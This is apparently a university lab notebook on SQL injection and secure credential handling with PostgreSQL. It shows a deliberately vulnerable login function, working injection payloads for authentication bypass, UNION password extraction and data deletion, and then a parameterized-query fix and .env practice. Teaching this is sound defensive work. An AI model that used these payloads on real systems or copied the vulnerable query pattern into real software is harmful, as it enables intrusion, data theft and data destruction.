---
title: "Lab: SQL Injection & Secure Connectivity"
week: 11
type: lab
tags: [security, sql-injection, parameterized-queries, credentials, dotenv, postgres]
difficulty: intermediate
duration: "55 mins"
---

# Lab: SQL Injection & Secure Connectivity

## 1. Prerequisites & Setup

**Before starting this lab, you should:**
*   Review [w11_l22_concept_data_security.md](w11_l22_concept_data_security.md) for SQL injection concepts and defense strategies
*   Be comfortable with basic SQL (`SELECT`, `WHERE`, `INSERT`)

**What you'll accomplish:**
In this lab, you'll set up a vulnerable database, exploit it with SQL injection attacks, then fix the vulnerabilities using parameterized queries. You'll also practice secure credential management with environment variables and `.env` files.

**Important:** This lab demonstrates attacks in a **controlled, local environment** for educational purposes. Never attempt SQL injection against systems you don't own or have explicit permission to test.

---

### Environment Setup

```python
%%bash
# Install PostgreSQL
apt-get update -qq
apt-get install -y -qq postgresql postgresql-contrib > /dev/null
service postgresql start
sudo -u postgres psql -c "ALTER USER postgres PASSWORD 'labpass';"
echo "PostgreSQL started"
```

```python
# Setup: Install Python packages
!pip install -q psycopg2-binary python-dotenv sqlalchemy

import psycopg2
import os
from dotenv import load_dotenv

# Connect to PostgreSQL (local lab environment — credentials are intentionally visible here)
conn = psycopg2.connect(
    host="localhost",
    port=5432,
    user="postgres",
    password="labpass",
    dbname="postgres"
)
conn.autocommit = True
cursor = conn.cursor()

print("Connected to PostgreSQL")
```

<details>
<summary>Expected Output</summary>

~~~text
PostgreSQL started
Connected to PostgreSQL
~~~

</details>

---

## 2. Create the Vulnerable Database

We'll create a simple users table that simulates a web application's authentication database.

```python
# Create a users table with sample data
cursor.execute("DROP TABLE IF EXISTS users")
cursor.execute("""
    CREATE TABLE users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password VARCHAR(100) NOT NULL,
        email VARCHAR(100),
        role VARCHAR(20) DEFAULT 'user',
        salary NUMERIC(10, 2)
    )
""")

# Insert sample users (NOTE: passwords in plaintext — intentionally insecure for this demo)
cursor.execute("""
    INSERT INTO users (username, password, email, role, salary) VALUES
    ('ana',    'ana_secret_123',   'ana@upr.edu',    'admin',  85000.00),
    ('luis',   'luis_pass_456',    'luis@upr.edu',    'user',   52000.00),
    ('maria',  'maria_pwd_789',   'maria@upr.edu',   'user',   61000.00),
    ('carlos', 'carlos_key_012',  'carlos@upr.edu',  'user',   48000.00),
    ('sofia',  'sofia_auth_345',  'sofia@upr.edu',   'admin',  90000.00)
""")

cursor.execute("SELECT username, role FROM users ORDER BY id")
rows = cursor.fetchall()
print("=== Users Table ===")
for row in rows:
    print(f"  {row[0]:10s} ({row[1]})")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Users Table ===
  ana        (admin)
  luis       (user)
  maria      (user)
  carlos     (user)
  sofia      (admin)
~~~

</details>

---

## 3. The Vulnerable Login Function

This function simulates how a naive application might check credentials. **This code is intentionally insecure.**

```python
def login_vulnerable(username, password):
    """
    VULNERABLE login function — DO NOT use this pattern in real code.
    Builds SQL by concatenating user input directly into the query string.
    """
    query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"

    # Show the generated query (for learning purposes)
    print(f"  Query: {query}")

    cursor.execute(query)
    result = cursor.fetchone()

    if result:
        print(f"  LOGIN SUCCESS: {result[1]} (role: {result[2]})")
        return result
    else:
        print(f"  LOGIN FAILED: Invalid credentials")
        return None
```

### Normal Usage

```python
print("=== Normal Login ===")
login_vulnerable("ana", "ana_secret_123")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Normal Login ===
  Query: SELECT id, username, role FROM users WHERE username = 'ana' AND password = 'ana_secret_123'
  LOGIN SUCCESS: ana (role: admin)
~~~

</details>

---

## 4. Hack the Lab: SQL Injection Attacks

### Attack 1: Authentication Bypass

The classic injection — bypass the password check entirely.

```python
print("=== Attack 1: Authentication Bypass ===")
print("Input: username = \"' OR '1'='1' --\"")
print()
login_vulnerable("' OR '1'='1' --", "anything")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Attack 1: Authentication Bypass ===
Input: username = "' OR '1'='1' --"

  Query: SELECT id, username, role FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
  LOGIN SUCCESS: ana (role: admin)
~~~

The `OR '1'='1'` makes the `WHERE` clause always true. The `--` comments out the password check. The attacker logs in as the first user in the table (ana, who is an admin).

</details>

### Attack 2: Extract Data with UNION

The attacker doesn't just want to log in — they want to see *all* the data.

```python
print("=== Attack 2: UNION-based Data Extraction ===")
print("Goal: Extract all usernames and passwords")
print()

# The UNION must match the number of columns in the original SELECT (3 columns)
malicious_username = "' UNION SELECT id, username, password FROM users --"
query = f"SELECT id, username, role FROM users WHERE username = '{malicious_username}' AND password = 'x'"

print(f"  Query: {query}\n")

cursor.execute(query)
rows = cursor.fetchall()
print("  Results returned:")
for row in rows:
    print(f"    id={row[0]}, username={row[1]}, password/role={row[2]}")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Attack 2: UNION-based Data Extraction ===
Goal: Extract all usernames and passwords

  Query: SELECT id, username, role FROM users WHERE username = '' UNION SELECT id, username, password FROM users --' AND password = 'x'

  Results returned:
    id=1, username=ana, password/role=ana_secret_123
    id=2, username=luis, password/role=luis_pass_456
    id=3, username=maria, password/role=maria_pwd_789
    id=4, username=carlos, password/role=carlos_key_012
    id=5, username=sofia, password/role=sofia_auth_345
~~~

The attacker now has every username and password in the database.

</details>

### Attack 3: Extract Sensitive Columns

The attacker targets salary data — a column the application never intended to expose.

```python
print("=== Attack 3: Extracting Salary Data ===")
print()

malicious_input = "' UNION SELECT id, username, salary::text FROM users --"
query = f"SELECT id, username, role FROM users WHERE username = '{malicious_input}' AND password = 'x'"

print(f"  Query: {query}\n")

cursor.execute(query)
rows = cursor.fetchall()
print("  Leaked salary data:")
for row in rows:
    print(f"    {row[1]:10s} ${row[2]}")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Attack 3: Extracting Salary Data ===

  Query: SELECT id, username, role FROM users WHERE username = '' UNION SELECT id, username, salary::text FROM users --' AND password = 'x'

  Leaked salary data:
    ana        $85000.00
    luis       $52000.00
    maria      $61000.00
    carlos     $48000.00
    sofia      $90000.00
~~~

</details>

### Attack 4: Data Destruction

The most dangerous attack — deleting data.

```python
print("=== Attack 4: Data Destruction ===")
print()

# Count rows before attack
cursor.execute("SELECT COUNT(*) FROM users")
print(f"  Users before: {cursor.fetchone()[0]}")

# The attacker injects a DELETE statement
malicious_input = "'; DELETE FROM users WHERE role = 'user'; --"
query = f"SELECT id, username, role FROM users WHERE username = '{malicious_input}'"

print(f"  Query: {query}\n")
cursor.execute(query)

# Count rows after attack
cursor.execute("SELECT COUNT(*) FROM users")
remaining = cursor.fetchone()[0]
print(f"  Users after:  {remaining}")

cursor.execute("SELECT username, role FROM users")
for row in cursor.fetchall():
    print(f"    {row[0]:10s} ({row[1]})")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Attack 4: Data Destruction ===

  Users before: 5
  Query: SELECT id, username, role FROM users WHERE username = ''; DELETE FROM users WHERE role = 'user'; --'

  Users after:  2
    ana        (admin)
    sofia      (admin)
~~~

Three users deleted. In a production system with no backup, this data is gone permanently.

</details>

### Restore the Data

```python
# Restore the deleted users for the remaining exercises
cursor.execute("""
    INSERT INTO users (username, password, email, role, salary) VALUES
    ('luis',   'luis_pass_456',    'luis@upr.edu',    'user',   52000.00),
    ('maria',  'maria_pwd_789',   'maria@upr.edu',   'user',   61000.00),
    ('carlos', 'carlos_key_012',  'carlos@upr.edu',  'user',   48000.00)
    ON CONFLICT (username) DO NOTHING
""")
cursor.execute("SELECT COUNT(*) FROM users")
print(f"Users restored: {cursor.fetchone()[0]}")
```

<details>
<summary>Expected Output</summary>

~~~text
Users restored: 5
~~~

</details>

---

## 5. The Fix: Parameterized Queries

Now let's write the **secure** version of the login function.

```python
def login_secure(username, password):
    """
    SECURE login function — uses parameterized queries.
    The database driver sends the query template and values separately.
    User input is ALWAYS treated as data, never as SQL commands.
    """
    query = "SELECT id, username, role FROM users WHERE username = %s AND password = %s"

    print(f"  Template: {query}")
    print(f"  Params:   ({username!r}, {password!r})")

    cursor.execute(query, (username, password))
    result = cursor.fetchone()

    if result:
        print(f"  LOGIN SUCCESS: {result[1]} (role: {result[2]})")
        return result
    else:
        print(f"  LOGIN FAILED: Invalid credentials")
        return None
```

### Normal Login Still Works

```python
print("=== Secure Login: Normal Use ===")
login_secure("ana", "ana_secret_123")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Secure Login: Normal Use ===
  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
  Params:   ('ana', 'ana_secret_123')
  LOGIN SUCCESS: ana (role: admin)
~~~

</details>

### Injection Attempts Are Neutralized

```python
print("=== Secure Login: Injection Attempt 1 (Auth Bypass) ===")
login_secure("' OR '1'='1' --", "anything")
print()

print("=== Secure Login: Injection Attempt 2 (UNION) ===")
login_secure("' UNION SELECT id, username, password FROM users --", "x")
print()

print("=== Secure Login: Injection Attempt 3 (DELETE) ===")
login_secure("'; DELETE FROM users; --", "x")

# Verify no data was lost
cursor.execute("SELECT COUNT(*) FROM users")
print(f"\nUsers still intact: {cursor.fetchone()[0]}")
```

<details>
<summary>Expected Output</summary>

~~~text
=== Secure Login: Injection Attempt 1 (Auth Bypass) ===
  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
  Params:   ("' OR '1'='1' --", 'anything')
  LOGIN FAILED: Invalid credentials

=== Secure Login: Injection Attempt 2 (UNION) ===
  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
  Params:   ("' UNION SELECT id, username, password FROM users --", 'x')
  LOGIN FAILED: Invalid credentials

=== Secure Login: Injection Attempt 3 (DELETE) ===
  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
  Params:   ("'; DELETE FROM users; --", 'x')
  LOGIN FAILED: Invalid credentials

Users still intact: 5
~~~

Every injection attempt fails. The malicious input is treated as a literal string — the database searches for a user whose username is literally `' OR '1'='1' --` and finds nothing.

</details>

---

## 6. Secure Credential Management

### The Problem: Hardcoded Credentials

```python
# BAD: Credentials visible in source code
# connection_string = "postgresql://admin:s3cretP@ss!@production-db.example.com:5432/prod_db"
#
# If this file is committed to GitHub, anyone can access your production database.

print("=== The Problem ===")
print("Hardcoded credentials in source code get committed to version control.")
print("Even if deleted later, they remain in git history forever.")
```

### The Solution: `.env` Files

```python
# Step 1: Create a .env file (simulating what you'd create manually)
env_content = """# Database credentials (NEVER commit this file)
DB_HOST=localhost
DB_PORT=5432
DB_USER=postgres
DB_PASSWORD=labpass
DB_NAME=postgres
"""

with open(".env", "w") as f:
    f.write(env_content)

print("Created .env file")
print("Contents:")
with open(".env") as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            key = line.split("=")[0]
            print(f"  {key}=****")
```

<details>
<summary>Expected Output</summary>

~~~text
Created .env file
Contents:
  DB_HOST=****
  DB_PORT=****
  DB_USER=****
  DB_PASSWORD=****
  DB_NAME=****
~~~

</details>

```python
# Step 2: Load .env into environment variables
load_dotenv(override=True)

# Step 3: Read credentials from environment — never from the source code
db_host = os.environ["DB_HOST"]
db_port = os.environ["DB_PORT"]
db_user = os.environ["DB_USER"]
db_pass = os.environ["DB_PASSWORD"]
db_name = os.environ["DB_NAME"]

# Step 4: Connect using environment variables
conn2 = psycopg2.connect(
    host=db_host,
    port=int(db_port),
    user=db_user,
    password=db_pass,
    dbname=db_name
)
cursor2 = conn2.cursor()
cursor2.execute("SELECT current_user, current_database()")
user, database = cursor2.fetchone()
print(f"Connected as '{user}' to database '{database}'")
print("Credentials loaded from .env — not visible in this code!")

cursor2.close()
conn2.close()
```

<details>
<summary>Expected Output</summary>

~~~text
Connected as 'postgres' to database 'postgres'
Credentials loaded from .env — not visible in this code!
~~~

</details>

### The `.gitignore` Rule

```python
# Step 5: Always add .env to .gitignore
gitignore_content = """# Environment variables — NEVER commit
.env
.env.local
.env.production

# Other sensitive files
*.pem
*.key
credentials.json
"""

with open(".gitignore_example", "w") as f:
    f.write(gitignore_content)

print("=== .gitignore must include ===")
print("  .env")
print("  .env.local")
print("  .env.production")
print()
print("If you accidentally commit credentials:")
print("  1. Rotate the credential IMMEDIATELY (change the password)")
print("  2. Remove from git history (git filter-branch or BFG Repo-Cleaner)")
print("  3. Force push (only after rotating the credential)")
```

<details>
<summary>Expected Output</summary>

~~~text
=== .gitignore must include ===
  .env
  .env.local
  .env.production

If you accidentally commit credentials:
  1. Rotate the credential IMMEDIATELY (change the password)
  2. Remove from git history (git filter-branch or BFG Repo-Cleaner)
  3. Force push (only after rotating the credential)
~~~

</details>

---

## 7. Your Turn! (Exercises)

### Exercise 1: Secure Search Function

**Task:** The function below searches for users by a partial name match. It is **vulnerable** to SQL injection. Rewrite it using parameterized queries.

~~~python
def search_users_vulnerable(search_term):
    """VULNERABLE — rewrite this function."""
    query = f"SELECT username, email, role FROM users WHERE username LIKE '%{search_term}%'"
    cursor.execute(query)
    return cursor.fetchall()
~~~

**Hint:** For `LIKE` with parameterized queries, include the `%` wildcards in the parameter value, not in the SQL template: `cursor.execute("SELECT ... WHERE username LIKE %s", (f"%{search_term}%",))`

```python
# TODO: Write search_users_secure(search_term) using parameterized queries

# Test:
# print(search_users_secure("a"))   # Should return ana, maria, carlos
# print(search_users_secure("' OR '1'='1"))  # Should return empty list
```

<details>
<summary>Expected Output</summary>

~~~text
Normal search for 'a':
  [('ana', 'ana@upr.edu', 'admin'), ('maria', 'maria@upr.edu', 'user'), ('carlos', 'carlos@upr.edu', 'user')]

Injection attempt "' OR '1'='1":
  []
~~~

</details>

### Exercise 2: Parameterized INSERT

**Task:** Write a `create_user(username, email, role)` function that safely inserts a new user. Use parameterized queries. Test it with both normal input and an injection attempt.

**Hint:** `cursor.execute("INSERT INTO users (username, password, email, role) VALUES (%s, %s, %s, %s)", (username, 'temp_pass', email, role))`

```python
# TODO: Write create_user(username, email, role) with parameterized INSERT
# TODO: Test with normal input: create_user("pedro", "pedro@upr.edu", "user")
# TODO: Test with injection: create_user("'; DROP TABLE users; --", "evil@hack.com", "admin")
# TODO: Verify the table still exists and the injection string was stored as a literal username
```

<details>
<summary>Expected Output</summary>

~~~text
Created user: pedro
Created user: '; DROP TABLE users; --

All users still in table:
  ana, luis, maria, carlos, sofia, pedro, '; DROP TABLE users; --

Table intact: True (7 users)
~~~

The injection string is stored as a literal username — the SQL structure was never affected.

</details>

### Exercise 3: Credential Audit

**Task:** Review the following code snippet and identify all security issues. List each vulnerability and how to fix it.

~~~python
import psycopg2

# Database connection
conn = psycopg2.connect(
    host="prod-db.company.com",
    user="admin",
    password="Pr0d_P@ssw0rd!",
    dbname="customer_data"
)
cursor = conn.cursor()

# Search for a customer
customer_name = input("Enter customer name: ")
cursor.execute(f"SELECT * FROM customers WHERE name = '{customer_name}'")
results = cursor.fetchall()

for row in results:
    print(f"Name: {row[1]}, SSN: {row[2]}, Credit Card: {row[3]}")
~~~

```python
# TODO: List each vulnerability and its fix (as comments or print statements)
# Hint: There are at least 4 distinct security issues
```

<details>
<summary>Expected Output</summary>

~~~text
Security Issues Found:

1. HARDCODED CREDENTIALS: Password "Pr0d_P@ssw0rd!" is in source code.
   Fix: Use os.environ["DB_PASSWORD"] with a .env file.

2. SQL INJECTION: f-string concatenation of customer_name into query.
   Fix: cursor.execute("SELECT * FROM customers WHERE name = %s", (customer_name,))

3. EXCESSIVE DATA EXPOSURE: Printing SSN and credit card numbers to console.
   Fix: Only select/display necessary fields. Mask sensitive data (e.g., "****1234").

4. NO PRINCIPLE OF LEAST PRIVILEGE: Using "admin" user for a search query.
   Fix: Use a read-only database user with access only to needed tables/columns.
~~~

</details>

---

## 8. Cleanup

```python
# Clean up
cursor.execute("DROP TABLE IF EXISTS users")
cursor.close()
conn.close()

# Remove the .env file we created
import os
for f in [".env", ".gitignore_example"]:
    if os.path.exists(f):
        os.remove(f)

print("Lab cleanup complete")
```

---

## Summary

In this lab, you:
*   Built a **vulnerable login function** using string concatenation and exploited it with four types of SQL injection (authentication bypass, UNION data extraction, sensitive data leak, data destruction)
*   Wrote a **secure login function** using **parameterized queries** (`%s` placeholders) that neutralized all injection attempts
*   Observed that parameterized queries treat all user input as **literal data**, never as SQL commands
*   Practiced **secure credential management** using `.env` files and `python-dotenv`
*   Learned the `.gitignore` rule: credential files must never enter version control

**Next week:** You'll build a Data Access Layer (DAL) using connection pooling, the DAO pattern, and SQLAlchemy ORM — combining everything you've learned about secure, structured database access.
